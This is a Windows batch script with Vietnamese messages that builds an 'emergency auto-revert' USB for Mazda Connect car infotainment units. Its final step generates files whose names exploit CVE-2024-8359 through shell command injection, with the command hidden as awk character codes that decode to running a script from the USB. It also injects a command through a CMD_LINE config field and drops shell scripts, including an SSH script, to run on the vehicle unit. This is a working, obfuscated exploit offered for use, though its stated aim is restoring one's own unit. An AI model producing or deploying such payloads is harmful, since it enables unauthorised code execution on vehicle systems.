@echo off
setlocal EnableDelayedExpansion
chcp 65001 >nul
title Tao USB Auto-Revert Khan Cap cho Mazda CMU

echo ==========================================================
echo   CÔNG CỤ TẠO USB AUTO-REVERT KHẨN CẤP (MAZDA CMU)
echo   Tu dong khoi phuc he thong Mazda Connect ve nguyen ban
echo ==========================================================
echo.

where powershell >nul 2>&1
if errorlevel 1 (
  echo LỖI: Máy tính của bạn không tìm thấy powershell.exe.
  pause
  exit /b 1
)

:: Kiểm tra quyền Admin
net session >nul 2>&1
if %errorlevel%==0 (set "IS_ADMIN=1") else (set "IS_ADMIN=0")

echo Đang quét các ổ USB gắn ngoài...
echo.

set "PSOUT=%TEMP%\mzd_revert_disks.txt"
del /q "%PSOUT%" 2>nul
powershell -NoProfile -ExecutionPolicy Bypass -Command "$rows = Get-CimInstance Win32_LogicalDisk -Filter 'DriveType=2' | ForEach-Object { $lbl = if ($_.VolumeName) { $_.VolumeName } else { '(Không tên)' }; '{0}|{1}|{2:N1} GB' -f $_.DeviceID, $lbl, ($_.Size/1GB) }; if (-not $rows) { $rows = Get-Disk | Where-Object { $_.BusType -eq 'USB' } | Get-Partition | Get-Volume | Where-Object { $_.DriveLetter } | ForEach-Object { $lbl = if ($_.FileSystemLabel) { $_.FileSystemLabel } else { '(Không tên)' }; '{0}:|{1}|{2:N1} GB' -f $_.DriveLetter, $lbl, ($_.Size/1GB) } }; $rows | Out-File -Encoding ASCII '%PSOUT%'" 2>nul

if not exist "%PSOUT%" (
  echo LỖI: Không thể quét ổ đĩa qua PowerShell.
  pause
  exit /b 1
)

set /a N=0
for /f "usebackq tokens=1,2,3 delims=|" %%a in ("%PSOUT%") do (
  set /a N+=1
  set "DRIVE_!N!=%%a"
  set "LABEL_!N!=%%b"
  set "SIZE_!N!=%%c"
  echo   !N!  %%a  ^(%%b - %%c^)
)
del /q "%PSOUT%" 2>nul

if !N!==0 (
  echo Không tìm thấy ổ USB nào! Vui lòng cắm USB và chạy lại script.
  pause
  exit /b 1
)

echo   0  Hủy bỏ
echo.
set "CH="
set /p "CH=Chọn số thứ tự ổ USB cần tạo Auto-Revert: "
if "!CH!"=="" exit /b 0
if "!CH!"=="0" exit /b 0

set "TARGET=!DRIVE_%CH%!"
if "!TARGET!"=="" (echo Lựa chọn không hợp lệ! & pause & exit /b 1)

echo.
echo CẢNH BÁO: Toàn bộ dữ liệu trên ổ !TARGET! sẽ bị XOÁ SẠCH để format FAT32!
set "CONFIRM="
set /p "CONFIRM=Bạn có chắc chắn muốn format ổ !TARGET! thành FAT32 / MZD không? [y/N]: "
if /i not "!CONFIRM!"=="y" (echo Đã hủy thao tác. & pause & exit /b 0)

echo.
echo [1/3] Đang format !TARGET! thành FAT32 / MZD...

powershell -NoProfile -ExecutionPolicy Bypass -Command "$drive = '!TARGET!'.TrimEnd(':'); Format-Volume -DriveLetter $drive -FileSystem FAT32 -NewFileSystemLabel 'MZD' -Confirm:$false" >nul 2>&1
if errorlevel 1 (
  format !TARGET! /FS:FAT32 /V:MZD /Q /Y >nul 2>&1
)

if not exist "!TARGET!\" (
  echo LỖI: Format ổ đĩa thất bại!
  pause
  exit /b 1
)

echo [2/3] Đang sao chép các file Auto-Revert vào !TARGET!...

set "SCRIPT_DIR=%~dp0"
set "SCRIPT_DIR=%SCRIPT_DIR:~0,-1%"

:: 1. jci-autoupdate
type nul > "!TARGET!\jci-autoupdate"

:: 2. dataRetrieval_config.txt
(
echo CMU_STATUS=no
echo DATA_PERSIST=no
echo SCREENSHOT=no
echo MEMINFO=no
echo TOP_LOG=no
echo SMEVENTS=no
echo NVRAM_DATA=no
echo THREAD_INFO=no
echo VUI_LOG=no
echo GPIO_DATA=no
echo SETTINGS_BIN=no
echo SMAPS_VALUE=no
echo TEST_MODE=no
echo VUI_ECO_FILES=no
echo BDS_DATA=no
echo FLASHINFO=no
echo SCI_LOG=no
echo LOG_TIMEOUT=180
echo TMP_FILTER=
echo CMD_LINE=sh /mnt/sd*/auto-revert.sh
) > "!TARGET!\dataRetrieval_config.txt"

:: 3. auto-revert.sh
copy /y "%SCRIPT_DIR%\auto-revert.sh" "!TARGET!\auto-revert.sh" >nul

:: 4. Trampoline t
(
echo #!/bin/sh
echo mkdir /tmp/hud-up-lock 2^>/dev/null ^|^| exit 0
echo trap 'rmdir /tmp/hud-up-lock 2^>/dev/null' EXIT
echo MYDIR=$(dirname "$0"^)
echo for p in "$MYDIR/auto-revert.sh" "/mnt/sd*1/auto-revert.sh" "/tmp/mnt/sd*1/auto-revert.sh"; do
echo   for f in $p; do
echo     if [ -f "$f" ]; then
echo       exec sh "$f"
echo     fi
echo   done
echo done
) > "!TARGET!\t"

:: 5. tweaks.sh
(
echo #!/bin/sh
echo MYDIR=$(dirname "$(readlink -f "$0" 2^>/dev/null ^|^| echo "$0"^)"^)
echo if [ -f "$MYDIR/auto-revert.sh" ]; then
echo   exec sh "$MYDIR/auto-revert.sh"
echo fi
) > "!TARGET!\tweaks.sh"

:: 6. s (SSH script)
if exist "%SCRIPT_DIR%\s" copy /y "%SCRIPT_DIR%\s" "!TARGET!\s" >nul

:: 7. MP3 / Webview fallback
if exist "%SCRIPT_DIR%\mp3title.txt" copy /y "%SCRIPT_DIR%\mp3title.txt" "!TARGET!\" >nul
if exist "%SCRIPT_DIR%\dev.html" copy /y "%SCRIPT_DIR%\dev.html" "!TARGET!\" >nul
if not exist "!TARGET!\mp3" mkdir "!TARGET!\mp3"
if not exist "!TARGET!\js" mkdir "!TARGET!\js"
if not exist "!TARGET!\css" mkdir "!TARGET!\css"
if exist "%SCRIPT_DIR%\mp3\*.mp3" copy /y "%SCRIPT_DIR%\mp3\*.mp3" "!TARGET!\mp3\" >nul
if exist "%SCRIPT_DIR%\mp3\*.mp3" copy /y "%SCRIPT_DIR%\mp3\*.mp3" "!TARGET!\" >nul
if exist "%SCRIPT_DIR%\js\*" xcopy /e /y /q "%SCRIPT_DIR%\js\*" "!TARGET!\js\" >nul
if exist "%SCRIPT_DIR%\css\*" xcopy /e /y /q "%SCRIPT_DIR%\css\*" "!TARGET!\css\" >nul

:: 8. Tạo 2 file .up khai thác CVE-2024-8359
echo [3/3] Đang tạo payload CVE-2024-8359...
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "$t = '!TARGET!\'; " ^
  "$f1 = $t + '$(awk -v f=%c ''BEGIN{s=f f f f f f f f f f f f f f f f f f f;system(sprintf(s,115,104,32,47,109,110,116,47,115,100,91,97,98,99,100,93,49,47,116))}''^).up'; " ^
  "$f2 = $t + '$(awk -v f=%c ''BEGIN{s=f f f f f f f f f f f f f f f f f f f f f f f;system(sprintf(s,115,104,32,47,116,109,112,47,109,110,116,47,115,100,91,97,98,99,100,93,49,47,116))}''^).up'; " ^
  "New-Item -ItemType File -Path $f1 -Force | Out-Null; " ^
  "New-Item -ItemType File -Path $f2 -Force | Out-Null"

echo.
echo ==========================================================
echo   TẠO USB AUTO-REVERT THÀNH CÔNG!
echo ----------------------------------------------------------
echo   Khi gặp sự cố, bạn chỉ cần cắm USB này vào cổng USB 1 trên xe.
echo   Xe sẽ tự động khôi phục về zin và khởi động lại sau 5 giây.
echo ==========================================================
echo.
pause
